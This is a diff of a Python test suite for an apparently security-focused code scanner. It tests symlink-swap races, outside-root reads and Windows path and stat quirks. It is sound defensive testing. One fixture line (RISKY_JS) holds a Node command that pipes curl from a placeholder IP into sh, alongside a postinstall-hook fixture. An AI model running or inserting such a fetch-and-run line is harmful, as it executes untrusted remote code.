@@ -15,8 +15,15 @@ opened is not read (SC-TRUNCATED at it, the call incomplete), and nothing outsid
 The swaps are made at a fixed point (after the check, after the walk lists the root, after the walk), as the report's
 repro makes its swap after the stat. Only what follows the read (decoding, the rules) is stubbed where a test watches
 what reached the scanner (scan_files); the directory tests run the real scanner and watch what is listed and read.
-Fixtures are inert text files in temporary directories; where links cannot be made (Windows without the privilege)
-the tests skip."""
+Fixtures are inert text files in temporary directories, written as bytes ("\\n", on Windows too); where links cannot
+be made (Windows without the privilege) the tests skip.
+
+Windows has no such anchored open (core._ANCHORED_OPEN: no dir_fd, no O_NOFOLLOW): a file is opened by its path, links
+followed, and kept only when the final path of what was opened is under the root (core._open_verified), and a tree
+is read by path, each folder checked so (core._Root). Where a test checks what the anchored open says, it checks what
+Windows' says there: of a file that leads outside the root now (it is outside the root), of a folder (Windows will not
+open one as a file: permission denied), of a path through a folder that is a file now (no such path: as a file gone).
+Nothing is read in any of them."""
 
 import contextlib
 import os
@@ -29,10 +36,25 @@ from unittest import mock
 
 from lazaret.mcp import server
 from lazaret.scanner import core as lazaret
-from tests._folding_disk import folding_disk, tells_names_apart
+from tests._folding_disk import apfs_fold, folding_disk, tells_names_apart
 
 INSIDE = "x = 1\n"
 MARKER = "OUTSIDE_ROOT_MARKER = 'read-across-the-boundary'\n"
+#: what scan_files says of a file whose path leads outside the root now, where it is opened by its path and its
+#: handle's final path checked (Windows: core._open_verified), not beneath the root a directory at a time
+OPENED_OUTSIDE = "not read: the file opened is outside the allowed root: its path changed after it was checked"
+
+
+def _write(folder, rel, text):
+    """`rel` ('/'-separated) under `folder`, its text's bytes as they are (no "\\r\\n" on Windows)."""
+    with open(os.path.join(folder, *rel.split("/")), "w", encoding="utf-8", newline="\n") as fh:
+        fh.write(text)
+
+
+def _changed(anchored):
+    """What scan_files says of a file a part of whose path was swapped for a link to outside after the check: the
+    anchored open's own words (`anchored`), else where its handle is (OPENED_OUTSIDE)."""
+    return anchored if lazaret._ANCHORED_OPEN else OPENED_OUTSIDE
 
 
 def _can_link():
@@ -78,8 +100,7 @@ class _Case(unittest.TestCase):
         self.seen = []
 
     def write(self, folder, rel, text):
-        with open(os.path.join(folder, *rel.split("/")), "w", encoding="utf-8") as fh:
-            fh.write(text)
+        _write(folder, rel, text)
 
     def roots(self, *roots):
         patch = mock.patch.dict(os.environ, {"LAZARET_MCP_ROOTS": os.pathsep.join(roots)})
@@ -167,7 +188,7 @@ class FileSwapTests(_Case):
             self.link(os.path.join(self.outside, "b.py"), path)
         with self.watching(), self.swapped_after_the_check(swap):
             out = self.scan(path)
-        self.assertNotRead(out, path, "it is a symbolic link now: it changed after the path was checked")
+        self.assertNotRead(out, path, _changed("it is a symbolic link now: it changed after the path was checked"))
         self.assertEqual(self.seen, [])
 
     def test_a_directory_on_the_path_swapped_for_a_link_is_not_read(self):
@@ -179,7 +200,7 @@ class FileSwapTests(_Case):
             self.link(os.path.join(self.outside, "sub"), sub)
         with self.watching(), self.swapped_after_the_check(swap):
             out = self.scan(path)
-        self.assertNotRead(out, path, "sub on its path is a symbolic link or no directory now")
+        self.assertNotRead(out, path, _changed("sub on its path is a symbolic link or no directory now"))
         self.assertEqual(self.seen, [])
 
     def test_a_directory_on_the_path_swapped_for_a_file_is_not_read(self):
@@ -191,8 +212,14 @@ class FileSwapTests(_Case):
             self.write(self.inside, "sub", MARKER)
         with self.watching(), self.swapped_after_the_check(swap):
             out = self.scan(path)
-        self.assertNotRead(out, path, "is a symbolic link or no directory now")
+        if lazaret._ANCHORED_OPEN:
+            self.assertNotRead(out, path, "is a symbolic link or no directory now")
+        else:       # (opened by its path, which names nothing now, sub being a file: as a file gone after the check)
+            self.assertEqual(out["files"][path], {"error": "File not found"})
+        self.assertEqual(self.seen, [])
 
+    @unittest.skipUnless(lazaret._ANCHORED_OPEN, "the anchored open walks down the path; where a file is opened by its "
+                                                 "path (Windows), what it reaches is checked: WithoutAnAnchoredOpen*")
     def test_a_swap_while_the_path_is_walked_is_not_read(self):
         # the swap made between two opens of the walk: after the root's, before sub's
         path = os.path.join(self.inside, "sub", "c.py")
@@ -229,7 +256,7 @@ class FileSwapTests(_Case):
         with self.watching(), self.swapped_after_the_check(swap, paths=2):
             out = self.scan(good, bad)
         self.assertEqual(out["files"][good], {"issueCount": 0, "issues": []})
-        self.assertNotRead(out, bad, "symbolic link now")
+        self.assertNotRead(out, bad, _changed("symbolic link now"))
         self.assertIn("1 of 2 file(s) could not be read", out["incompleteReason"])
 
 
@@ -266,7 +293,9 @@ class LegitimateLinkTests(_Case):
         folder = os.path.join(self.inside, "pkg.py")
         os.mkdir(folder)
         out = self.scan(folder)
-        self.assertNotRead(out, folder, "it is a directory, not a regular file")
+        # (Windows will not open a folder as a file: permission denied, which is what it says there)
+        self.assertNotRead(out, folder, "it is a directory, not a regular file" if lazaret._ANCHORED_OPEN
+                           else "cannot read the file (Permission denied)")
         if hasattr(os, "mkfifo"):
             fifo = os.path.join(self.inside, "pipe.py")
             os.mkfifo(fifo)
@@ -361,8 +390,7 @@ class _DirectoryCase(unittest.TestCase):
         return inside, outside
 
     def write(self, folder, rel, text):
-        with open(os.path.join(folder, *rel.split("/")), "w", encoding="utf-8") as fh:
-            fh.write(text)
+        _write(folder, rel, text)
 
     def roots(self, *roots):
         patch = mock.patch.dict(os.environ, {"LAZARET_MCP_ROOTS": os.pathsep.join(roots)})
@@ -394,8 +422,8 @@ class _DirectoryCase(unittest.TestCase):
             self.reads.append(data)
             return data
 
-        def listdir(tree, parts=()):
-            got = real_listdir(tree, parts)
+        def listdir(tree, parts=(), **kwargs):
+            got = real_listdir(tree, parts, **kwargs)
             self.listed.extend(e.name for e in got)
             if swap and when == "listed" and state["walking"] and not state["swapped"] and tuple(parts) == after:
                 swap_now(tree)
@@ -417,6 +445,24 @@ class _DirectoryCase(unittest.TestCase):
         self.assertFalse([d for d in self.reads if MARKER.encode() in d], "a file outside the root was read")
         self.assertNotIn("outside_only.py", self.listed, "a folder outside the root was listed")
 
+    def assertLoopAsBefore(self):
+        """sub/, listed by the walk as the root met again (a bind mount's or a hard-linked folder's identity), is a
+        filesystem loop and not entered on POSIX, however the tree is read (the review of round 3, L2: the loop check
+        was the anchored walk's alone); on Windows no file ID tells a loop (none is followed there), and it is read."""
+        inside, _outside = self.tree()
+        real, root = lazaret._Root.listdir, os.lstat(inside)
+
+        def listdir(tree, parts=(), **kwargs):
+            got = real(tree, parts, **kwargs)
+            if tuple(parts) == () and kwargs.get("identify", True):
+                return [lazaret._Entry(e.name, root) if e.name == "sub" else e for e in got]
+            return got
+        with mock.patch.object(lazaret._Root, "listdir", listdir), self.watching():
+            out = server.tool_scan_directory({"path": inside})
+        loops = [i["file"] for i in out["issues"] if "filesystem loop" in i["msg"]]
+        self.assertEqual(loops, [] if os.name == "nt" else ["sub"], out["issues"])
+        self.assertEqual(self.reads.count(INSIDE.encode()), 2 if os.name == "nt" else 1)     # (a.py; sub/c.py)
+
     def assertNotRead(self, name, out, rel, why=CHANGED):
         self.assertEqual(out["qualityGate"], "FAILED")
         self.assertTrue(out.get("incomplete"), out)
@@ -429,6 +475,9 @@ class _DirectoryCase(unittest.TestCase):
 
 
 class DirectorySwapTests(_DirectoryCase):
+    def test_a_folder_met_again_is_a_loop_as_before(self):
+        self.assertLoopAsBefore()
+
     def test_a_folder_swapped_for_a_link_during_the_walk_is_not_read(self):
         for name, tool in TOOLS:
             with self.subTest(tool=name):
@@ -570,16 +619,16 @@ class DirectoryWithoutAnAnchoredOpenTests(_DirectoryCase):
 
     def setUp(self):
         super().setUp()
-        probe = os.open(self.base, os.O_RDONLY)
-        try:
-            if lazaret._opened_path(probe) is None:
-                self.skipTest("this platform cannot say where an opened folder is")
-        finally:
-            os.close(probe)
+        # (as the walk asks it: Windows opens a folder with CreateFileW, as os.open cannot)
+        if lazaret._folder_final_path(self.base) is None:
+            self.skipTest("this platform cannot say where an opened folder is")
         for patch in (mock.patch.object(lazaret, "_ANCHORED_OPEN", False),
                       mock.patch.object(lazaret, "_OPEN_FLAGS", lazaret._OPEN_FLAGS & ~getattr(os, "O_NOFOLLOW", 0))):
             patch.start()
             self.addCleanup(patch.stop)
+
+    def test_a_folder_met_again_is_a_loop_as_before(self):
+        self.assertLoopAsBefore()
 
     def test_swaps_during_the_walk_are_not_read(self):
         for name, tool in TOOLS:
@@ -627,6 +676,91 @@ class DirectoryWithoutAnAnchoredOpenTests(_DirectoryCase):
         self.assertEqual(sorted(i["file"] for i in out["issues"] if i["rule"] == "Q-SYMLINK"), ["link.py", "out"])
         self.assertNothingOutside()
 
+    def test_a_folder_past_max_path_is_truncated_where_the_system_will_not_take_its_path(self):
+        # (LZ-03's review of PR #17, L7: Windows without its long paths (LongPathsEnabled 0, its default) takes no plain
+        # path of 260 characters or more, and the tree is read by plain paths there: a folder past that is not read,
+        # SC-TRUNCATED at it, the result incomplete, as a folder nested too deep is. Where the system takes it (a
+        # runner with long paths, Linux), the walk reads it; that system is made one that will not here, refusing
+        # such a path as Win32 does, ERROR_PATH_NOT_FOUND)
+        inside, _outside = self.tree()
+        chain, at = [], inside
+        while len(at) < _MAX_PATH + 40:
+            chain.append("d" * 40)
+            at = os.path.join(at, chain[-1])
+            os.mkdir(_plain_or_extended(at))
+        with open(_plain_or_extended(os.path.join(at, "deep.js")), "wb") as fh:
+            fh.write(RISKY_JS.encode())
+        self.addCleanup(_remove_chain, inside, chain)
+        for limited in (False, True):
+            with self.subTest(max_path=limited):
+                self.reads.clear()
+                self.listed.clear()
+                with self.watching(), (_without_long_paths() if limited else contextlib.nullcontext()):
+                    out = server.tool_scan_directory({"path": inside, "max_issues": 500})
+                deep = os.path.join(*chain, "deep.js")
+                truncated = [i["file"] for i in out["issues"] if i["rule"] == "SC-TRUNCATED"]
+                if not limited and _takes_long_paths(at):
+                    self.assertFalse(out.get("incomplete"), out)
+                    self.assertEqual(truncated, [])
+                    self.assertIn(RISKY_JS.encode(), self.reads)
+                    continue
+                self.assertEqual(out["qualityGate"], "FAILED")
+                self.assertTrue(out.get("incomplete"), out)
+                self.assertEqual(len(truncated), 1, out["issues"])
+                self.assertTrue(deep == truncated[0] or deep.startswith(truncated[0] + os.sep), truncated)
+                self.assertGreater(len(os.path.join(inside, truncated[0])), _MAX_PATH - 50, truncated)
+                self.assertNotIn(RISKY_JS.encode(), self.reads)
+                self.assertNothingOutside()
+
+
+#: Win32's MAX_PATH: a plain path (not \\?\) of this many characters or more is not taken where long paths are off
+_MAX_PATH = 260
+
+
+def _plain_or_extended(path):
+    """`path` as it can be made whatever the system's long paths: on Windows, absolute with the extended-length prefix
+    (\\\\?\\); elsewhere as it is."""
+    if os.name != "nt":
+        return path
+    path = os.path.abspath(path)
+    return path if path.startswith("\\\\?\\") else "\\\\?\\" + path
+
+
+def _takes_long_paths(path):
+    try:
+        os.lstat(path)
+        return True
+    except OSError:
+        return False
+
+
+def _remove_chain(inside, chain):
+    """inside/<chain…>/deep.js and the chain's folders, removed by extended-length paths on Windows (shutil.rmtree's
+    plain ones may be too long there)."""
+    folders = [os.path.join(inside, *chain[:k]) for k in range(1, len(chain) + 1)]
+    with contextlib.suppress(OSError):
+        os.unlink(_plain_or_extended(os.path.join(folders[-1], "deep.js")))
+    for folder in reversed(folders):
+        with contextlib.suppress(OSError):
+            os.rmdir(_plain_or_extended(folder))
+
+
+@contextlib.contextmanager
+def _without_long_paths():
+    """The path calls the walk makes refuse a plain path of MAX_PATH characters or more (FileNotFoundError), as
+    Windows' do where long paths are off; an extended-length one (\\\\?\\) is taken."""
+    def refusing(real):
+        def call(path, *args, **kwargs):
+            if isinstance(path, str) and len(path) >= _MAX_PATH and not path.startswith("\\\\?\\"):
+                raise FileNotFoundError(2, "The system cannot find the path specified", path)
+            return real(path, *args, **kwargs)
+        return call
+    with contextlib.ExitStack() as stack:
+        for name in ("lstat", "stat", "open", "scandir", "readlink"):
+            stack.enter_context(mock.patch.object(os, name, refusing(getattr(os, name))))
+        stack.enter_context(mock.patch.object(lazaret, "_folder_final_path", refusing(lazaret._folder_final_path)))
+        yield
+
 
 # ---------------------------------------------------------------- LZ-03's review
 RISKY_JS = "require('child_process').execSync('curl -s https://198.51.100.7/p.sh | sh');\n"    # (inert: never run)
@@ -648,7 +782,8 @@ class _SwapCase(_DirectoryCase):
 
     def change(self, inside, outside, rel, how):
         """`rel` under inside/ swapped: for a link to its twin outside, a folder, another file (another inode, the same
-        text), or nothing."""
+        text, size and modification time: what a copy made within one tick of the system's clock has on NTFS, which
+        stamps a file's times from it), or nothing."""
         at = os.path.join(inside, *rel.split("/"))
         if how == "link":
             twin = os.path.join(outside, *rel.split("/"))
@@ -659,7 +794,9 @@ class _SwapCase(_DirectoryCase):
             os.rename(at, at + ".old")
             os.mkdir(at)
         elif how == "other file":
+            st = os.stat(at)
             shutil.copyfile(at, at + ".new")
+            os.utime(at + ".new", ns=(st.st_atime_ns, st.st_mtime_ns))
             os.replace(at + ".new", at)
         else:
             os.unlink(at)
@@ -764,7 +901,17 @@ class ReviewTests(_SwapCase):
 
     @staticmethod
     def comb(where, depth):
-        """where/d/d/…/d (`depth` folders) with a folder z holding b.py beside every d: 2 × depth folders."""
+        """where/d/d/…/d (`depth` folders) with a folder z holding b.py beside every d: 2 × depth folders. Made
+        beneath each folder's descriptor (a path that long may be longer than the system takes), or by path where
+        there is none (Windows)."""
+        if not (os.mkdir in os.supports_dir_fd and os.open in os.supports_dir_fd):
+            for _ in range(depth):
+                os.mkdir(os.path.join(where, "d"))
+                os.mkdir(os.path.join(where, "z"))
+                with open(os.path.join(where, "z", "b.py"), "wb") as fh:
+                    fh.write(b"x = 1\n")
+                where = os.path.join(where, "d")
+            return
         fd = os.open(where, os.O_RDONLY)
         try:
             for _ in range(depth):
@@ -817,18 +964,24 @@ class ReviewTests(_SwapCase):
         self.assertEqual(len(os.listdir("/proc/self/fd")), before)
 
     def test_a_tree_deeper_than_the_cap_is_incomplete(self):
-        inside, _outside = self.tree()
-        self.comb(os.path.join(inside, "sub"), lazaret.MAX_WALK_DEPTH)       # (sub/d…: 513 deep at its bottom)
-        for name, tool in TOOLS:
-            with self.subTest(tool=name):
-                out = tool({"path": inside, "max_issues": 2000})
-                self.assertEqual(out["qualityGate"], "FAILED")
-                self.assertTrue(out["incomplete"])
-                self.assertIn("2 folders nested deeper than 512 folders were not read", out["incompleteReason"])
-                if name == "scan_directory":
-                    deep = os.path.join("sub", *["d"] * (lazaret.MAX_WALK_DEPTH - 1))
-                    self.assertEqual(sorted(i["file"] for i in out["issues"] if i["rule"] == "SC-TRUNCATED"),
-                                     [os.path.join(deep, "d"), os.path.join(deep, "z")])
+        # (where the tree is read by path (Windows), each folder is lstat'ed along its path, a path as long as the
+        # folder is deep: a comb as deep as the cap costs some 10^6 lstats of paths of some 600 characters (and paths
+        # longer than Windows takes without its long paths), so the cap is lowered there; the walk is the same)
+        cap = lazaret.MAX_WALK_DEPTH if lazaret._ANCHORED_OPEN else 24
+        with mock.patch.object(lazaret, "MAX_WALK_DEPTH", cap):
+            inside, _outside = self.tree()
+            self.comb(os.path.join(inside, "sub"), cap)                     # (sub/d…: cap + 1 deep at its bottom)
+            for name, tool in TOOLS:
+                with self.subTest(tool=name):
+                    out = tool({"path": inside, "max_issues": 2000})
+                    self.assertEqual(out["qualityGate"], "FAILED")
+                    self.assertTrue(out["incomplete"])
+                    self.assertIn(f"2 folders nested deeper than {cap} folders were not read",
+                                  out["incompleteReason"])
+                    if name == "scan_directory":
+                        deep = os.path.join("sub", *["d"] * (cap - 1))
+                        self.assertEqual(sorted(i["file"] for i in out["issues"] if i["rule"] == "SC-TRUNCATED"),
+                                         [os.path.join(deep, "d"), os.path.join(deep, "z")])
 
     def test_the_target_is_checked_by_its_open_beneath_the_root(self):
         # (a link swapped in after the check: the same answer whether what it names outside exists or not; a file and
@@ -869,11 +1022,22 @@ class FoldingDiskTests(_SwapCase):
     Windows' NTFS by default), a package's text can name a file the walk listed by another spelling, which the disk
     opens. The after-walk check found the walk's record by the exact name, so a file a hook runs named `LIB/RUN.DAT`
     (on disk lib/run.dat), swapped after the walk, was read as it was then or taken for absent: its CRITICAL lost, the
-    call complete. Here the disk is the project's macOS stand-in (tests/_folding_disk.py; the real disk on a Mac)."""
+    call complete. Here the disk is the project's macOS stand-in (tests/_folding_disk.py; the real disk on a Mac).
+
+    On Windows the disk is the real one: the tools read the tree by its real path in its normcase form (lower case),
+    which the stand-in's roots, as given, are not. NTFS takes names differing in case for one (its upcase table), but
+    not names differing in Unicode form alone: a hook's NFD spelling of an NFC name names nothing there, as on a disk
+    that tells names apart (`_one_name`)."""
 
     SPELLINGS = (("lib/run.dat", "LIB/RUN.DAT", "LIB"),                    # (the file on disk, the hook's name,
                  ("lib/" + RESUME_NFC, "lib/" + RESUME_NFD, "lib"),         # what a swap of lib is reported at)
                  ("lib/" + RESUME_NFC, "LIB/" + RESUME_NFC.upper(), "LIB"))
+
+    @staticmethod
+    def _one_name(a, b):
+        """Does the disk these tests read take the paths `a` and `b` for one? The stand-in, and macOS's disk, when
+        they fold as one in case and Unicode form; Windows' when they are one in upper case, whatever their forms."""
+        return a.upper() == b.upper() if os.name == "nt" else apfs_fold(a) == apfs_fold(b)
 
     def hooked(self, inside, hook, rel):
         pkg = '{"name": "x", "version": "1.0.0", "scripts": {"postinstall": "node %s"}}\n' % hook
@@ -881,6 +1045,7 @@ class FoldingDiskTests(_SwapCase):
 
     def test_a_file_a_hook_names_by_another_spelling_swapped_after_the_walk_is_not_read(self):
         for rel, hook, folder in self.SPELLINGS:
+            reaches = self._one_name(rel, hook)         # (Windows' disk: not the NFD spelling)
             for name, tool in TOOLS:
                 inside, _outside = self.tree()
                 self.hooked(inside, hook, rel)
@@ -888,8 +1053,9 @@ class FoldingDiskTests(_SwapCase):
                     out = tool({"path": inside})
                 self.assertEqual(out["qualityGate"], "FAILED")
                 self.assertFalse(out.get("incomplete"), out)
-                if name == "scan_directory":
-                    self.assertIn(("SC-INSTALL-HOOK", "CRITICAL"), self.rules(out, "package.json"))
+                if name == "scan_directory":           # (a hook that runs a file not there: MAJOR, as before N1)
+                    self.assertIn(("SC-INSTALL-HOOK", "CRITICAL" if reaches else "MAJOR"),
+                                  self.rules(out, "package.json"))
                 for how in self.SWAPS + ("its folder for a link",):
                     with self.subTest(file=rel, hook=hook, tool=name, swap=how):
                         inside, outside = self.tree()
@@ -905,7 +1071,13 @@ class FoldingDiskTests(_SwapCase):
                         with folding_disk(inside), self.watching(swap, when="walked"):
                             out = tool({"path": inside})
                         at = folder if how == "its folder for a link" else hook
-                        self.assertNotRead(name, out, os.path.join(*at.split("/")))
+                        if reaches:
+                            self.assertNotRead(name, out, os.path.join(*at.split("/")))
+                        else:                   # (it names nothing, swapped or not: nothing outside is read, and the
+                            self.assertEqual(out["qualityGate"], "FAILED")      # hook that runs a file not there
+                            if name == "scan_directory":                         # is MAJOR still)
+                                self.assertIn(("SC-INSTALL-HOOK", "MAJOR"), self.rules(out, "package.json"))
+                            self.assertNothingOutside()
 
     def test_a_vendored_header_by_another_spelling_swapped_after_the_walk_is_not_read(self):
         vendor = dict(GO_VENDOR, **{"vendor/modules.txt": "# example.com/v v1.0.0\n## explicit\nexample.com/V\n"})
@@ -1027,13 +1199,13 @@ class RewrittenFileTests(_SwapCase):
             self.write(os.path.dirname(at), os.path.basename(at), INSIDE)
 
         def written_in_place(at):
-            with open(at, "r+", encoding="utf-8") as fh:
+            with open(at, "r+", encoding="utf-8", newline="\n") as fh:
                 fh.truncate(0)
                 fh.write(INSIDE)
 
-        def same_size_new_time(at):
+        def same_size_new_time(at):                 # (newline: "\n" alone, as the file was written, its size kept)
             st = os.stat(at)
-            with open(at, "r+", encoding="utf-8") as fh:
+            with open(at, "r+", encoding="utf-8", newline="\n") as fh:
                 fh.write("/" * len(RISKY_JS.rstrip("\n")) + "\n")
             os.utime(at, ns=(st.st_atime_ns, st.st_mtime_ns + 1_000_000_000))
         for name, tool in TOOLS:
@@ -1057,6 +1229,324 @@ class RewrittenFileTests(_SwapCase):
                 if name == "scan_directory":
                     self.assertIn(("SC-INSTALL-HOOK", "CRITICAL"), self.rules(out, "package.json"))
                     self.assertFalse([i for i in out["issues"] if i["rule"] == "SC-TRUNCATED"], out["issues"])
+
+
+#: The Windows CPythons whose stat calls WithoutFileIdsTests stands in for (_windows_stat): (3, 10) for 3.10 and 3.11,
+#: (3, 12) for 3.12 and later.
+WINDOWS_PYTHONS = ((3, 10), (3, 12))
+#: A file's creation time where it is stood in for: its modification time less this, a file written after it was made
+#: (_windows_stat).
+MADE_BEFORE_NS = 5_000_000_000
+_TUPLE_FIELDS = ("st_mode", "st_ino", "st_dev", "st_nlink", "st_uid", "st_gid", "st_size", "st_atime", "st_mtime",
+                 "st_ctime")
+#: This system's os.stat_result's fields given by name only (its float times, and st_file_attributes, st_birthtime and
+#: the like where it has them): _EntryWithoutId.
+_NAMED_ONLY = tuple(k for k in dir(os.stat_result) if k.startswith("st_") and k not in _TUPLE_FIELDS[:7])
+
+
+class _WindowsStat:
+    """An os.stat_result as Windows' CPython fills one: its fields by name and in order, its class os.stat_result (as
+    unittest.mock's spec gives one; os.stat_result takes no subclass, and has no st_birthtime_ns off Windows)."""
+
+    def __init__(self, fields):
+        self.__dict__.update(fields)
+
+    @property
+    def __class__(self):
+        return os.stat_result
+
+    def __getitem__(self, k):
+        return tuple(self)[k]
+
+    def __iter__(self):
+        return (int(getattr(self, name)) for name in _TUPLE_FIELDS)
+
+    def __len__(self):
+        return len(_TUPLE_FIELDS)
+
+
+def _windows_stat(st, python, call, name="", identity=True):
+    """`st`, this system's stat of a file, as Windows' CPython `python` fills `call`: "lstat" (os.lstat, os.stat of a
+    path, the listing's DirEntry.stat: posixmodule.c's win32_xstat and DirEntry_from_find_data, whose st_ctime is the
+    creation time from 3.12.3 and 0 on 3.12.0 to 3.12.2; the walk reads st_birthtime_ns there) or "fstat" (os.fstat,
+    os.stat of a descriptor: fileutils.c's _Py_fstat_noraise). From CPython's sources (3.10.11, 3.11.9, 3.12.0, 3.12.10,
+    3.13.0, 3.13.5, 3.14.0):
+    - st_ctime: on 3.12 and later the creation time from lstat (win32_xstat copies st_birthtime into it) and the change
+      time from fstat (FILE_BASIC_INFO.ChangeTime: this system's change time stands in for it); on 3.10 and 3.11 the
+      creation time from both (BY_HANDLE_FILE_INFORMATION.ftCreationTime).
+    - st_birthtime, st_birthtime_ns: the creation time from both on 3.12 and later; not there before.
+    - st_mode: lstat gives a .exe, .bat, .cmd or .com file the execute bits (update_st_mode_from_path), fstat does not.
+    - st_dev, st_ino, st_nlink: the volume, file ID and links from both (FILE_ID_INFO's, or
+      FILE_STAT_BASIC_INFORMATION's, where the disk gives them, else BY_HANDLE_FILE_INFORMATION's), this system's
+      here; none from the listing (`identity` False: FindNextFileW gives none).
+    - st_uid, st_gid 0; st_file_attributes, st_reparse_tag from the file's attributes (fstat's tag 0).
+    The creation time stands in as the modification time less MADE_BEFORE_NS: every call gives one file the same one,
+    never its change time, and a copy given another file's times has its creation time too (as a copy made within one
+    tick of the system's clock, or NTFS's tunnelling of a replaced name's creation time, gives it)."""
+    born = st.st_mtime_ns - MADE_BEFORE_NS
+    ctime = st.st_ctime_ns if call == "fstat" and python >= (3, 12) else born
+    mode = st.st_mode
+    if call == "lstat" and stat.S_ISREG(mode) and os.path.splitext(name)[1].lower() in (".exe", ".bat", ".cmd", ".com"):
+        mode |= 0o111
+    link = call == "lstat" and stat.S_ISLNK(mode)
+    fields = {"st_mode": mode, "st_ino": st.st_ino if identity else 0, "st_dev": st.st_dev if identity else 0,
+              "st_nlink": st.st_nlink if identity else 0, "st_uid": 0, "st_gid": 0, "st_size": st.st_size,
+              "st_atime": st.st_atime_ns / 1e9, "st_mtime": st.st_mtime_ns / 1e9, "st_ctime": ctime / 1e9,
+              "st_atime_ns": st.st_atime_ns, "st_mtime_ns": st.st_mtime_ns, "st_ctime_ns": ctime,
+              "st_file_attributes": 0x400 if link else 0x10 if stat.S_ISDIR(mode) else 0x20,
+              "st_reparse_tag": 0xA000000C if link else 0}
+    if python >= (3, 12):
+        fields.update(st_birthtime=born / 1e9, st_birthtime_ns=born)
+    return _WindowsStat(fields)
+
+
+class _EntryWithoutId:
+    """An os.scandir entry as Windows' gives one: its lstat (stat(follow_symlinks=False)) without an identity, st_ino,
+    st_dev and st_nlink 0 (Windows' DirEntry.stat reads the folder's listing, which has no file IDs). `python`: its
+    times too, as Windows' CPython `python` fills them (_windows_stat; DirEntry.stat of an entry that is no link is
+    that same stat there); None: this system's, every other field as listed (_NAMED_ONLY: on Windows
+    st_file_attributes and st_reparse_tag too, which the walk reads, and which os.stat_result makes None where it is
+    not given one; the win-scratch run of round 3c)."""
+
+    def __init__(self, entry, python=None):
+        self._entry, self.name, self.path, self._python = entry, entry.name, entry.path, python
+
+    def stat(self, *, follow_symlinks=True):
+        if self._python is not None:
+            if follow_symlinks and self._entry.is_symlink():
+                return os.stat(self.path)                   # (Windows' DirEntry.stat of a link: os.stat's)
+            return _windows_stat(self._entry.stat(follow_symlinks=False), self._python, "lstat", self.name,
+                                 identity=False)
+        st = self._entry.stat(follow_symlinks=follow_symlinks)
+        if follow_symlinks:
+            return st
+        return os.stat_result((st.st_mode, 0, 0, 0) + tuple(st)[4:], {k: getattr(st, k) for k in _NAMED_ONLY})
+
+    def is_dir(self, *, follow_symlinks=True):
+        return self._entry.is_dir(follow_symlinks=follow_symlinks)
+
+    def is_file(self, *, follow_symlinks=True):
+        return self._entry.is_file(follow_symlinks=follow_symlinks)
+
+    def is_symlink(self):
+        return self._entry.is_symlink()
+
+
+@contextlib.contextmanager
+def _listing_without_ids(python=None):
+    """os.scandir as Windows' lists a folder: its entries' lstat have no identity (_EntryWithoutId). `python` (one of
+    WINDOWS_PYTHONS): os.lstat, os.stat and os.fstat as that Windows CPython fills them too (_windows_stat), and the
+    walk told it reads Windows' (core._WINDOWS_TIMES, made where a tree has none, so that this runs on one without
+    it); None: this system's stat calls."""
+    real = os.scandir
+
+    @contextlib.contextmanager
+    def scandir(path="."):
+        with real(path) as it:
+            yield (_EntryWithoutId(e, python) for e in it)
+    with contextlib.ExitStack() as stack:
+        stack.enter_context(mock.patch.object(os, "scandir", scandir))
+        if python is not None:
+            real_lstat, real_stat, real_fstat = os.lstat, os.stat, os.fstat
+
+            def lstat(path, *, dir_fd=None):
+                return _windows_stat(real_lstat(path, dir_fd=dir_fd), python, "lstat", os.fspath(path))
+
+            def stat_(path, *, dir_fd=None, follow_symlinks=True):
+                st = real_stat(path, dir_fd=dir_fd, follow_symlinks=follow_symlinks)
+                if isinstance(path, int):
+                    return _windows_stat(st, python, "fstat")
+                return _windows_stat(st, python, "lstat", os.fspath(path))
+
+            def fstat(fd):
+                return _windows_stat(real_fstat(fd), python, "fstat")
+            for name, fake in (("lstat", lstat), ("stat", stat_), ("fstat", fstat)):
+                stack.enter_context(mock.patch.object(os, name, fake))
+            stack.enter_context(mock.patch.object(lazaret, "_WINDOWS_TIMES", True, create=True))
+        yield
+
+
+class WithoutFileIdsTests(_SwapCase):
+    """LZ-03 on Windows (PR #17's Windows runs: windows-11-arm, and once windows-latest on 3.10). Windows' listing
+    (os.scandir's DirEntry.stat) gives no file ID, and the walk held a file it listed to its kind, size and modification
+    time alone. A copy of a file made within one tick of the system's clock (some 15.6 ms: NTFS stamps a file's times
+    from it) has the same size and times, as one whose times its writer set back (SetFileTime) has, so another file
+    put in its place was read as the walk's file (the call complete), and one that could not be opened then was the
+    walk's unreadable file: a Q-UNREADABLE note, the gate passed for a file that changed. Now an entry the listing
+    gives no ID is lstat'ed by its exact path for its volume and file ID (core._Root.listdir), every later lstat and
+    fstat is held to it, and an entry whose ID cannot be had is not taken for one that has one.
+
+    The review of that fix (round 3, HIGH): the walk held the file to that lstat's change time too, and on Windows
+    with Python 3.12 and later os.lstat's st_ctime is the creation time, os.fstat's the change time, so a file written
+    after it was made was another file at every read (SC-TRUNCATED, incomplete, the gate FAILED, for a tree nobody
+    changed). The walk holds it to its creation time there (core._held_time).
+
+    The listing is Windows' here on every system (_listing_without_ids, around the call), and the tree is read by path,
+    as on Windows; where a test runs for each of WINDOWS_PYTHONS, os.lstat, os.stat and os.fstat are as that Windows
+    CPython fills them too (_windows_stat), None standing for this system's."""
+
+    PYTHONS = (None,) + WINDOWS_PYTHONS
+
+    def setUp(self):
+        super().setUp()
+        if lazaret._folder_final_path(self.base) is None:
+            self.skipTest("this platform cannot say where an opened folder is")
+        for patch in (mock.patch.object(lazaret, "_ANCHORED_OPEN", False),
+                      mock.patch.object(lazaret, "_OPEN_FLAGS", lazaret._OPEN_FLAGS & ~getattr(os, "O_NOFOLLOW", 0))):
+            patch.start()
+            self.addCleanup(patch.stop)
+
+    def test_the_listing_has_the_entries_ids(self):
+        inside, _outside = self.tree()
+        for python in self.PYTHONS:
+            with self.subTest(python=python):
+                tree = lazaret._Root(inside)
+                self.addCleanup(tree.close)
+                with _listing_without_ids(python):
+                    got = {e.name: e.stat() for e in tree.listdir(())}
+                    bare = {e.name: e.stat() for e in tree.listdir((), identify=False)}
+                for name in ("a.py", "sub"):
+                    st = os.lstat(os.path.join(inside, name))
+                    self.assertEqual((got[name].st_dev, got[name].st_ino), (st.st_dev, st.st_ino))
+                    self.assertEqual((bare[name].st_dev, bare[name].st_ino), (0, 0))      # (a count's: as listed)
+
+    def test_the_time_held_is_the_same_whichever_call_gave_it(self):
+        inside, _outside = self.tree()
+        at = os.path.join(inside, "a.py")
+        os.utime(at, ns=(0, 1_600_000_000_000_000_000))     # (its times set: the change time is not the creation time)
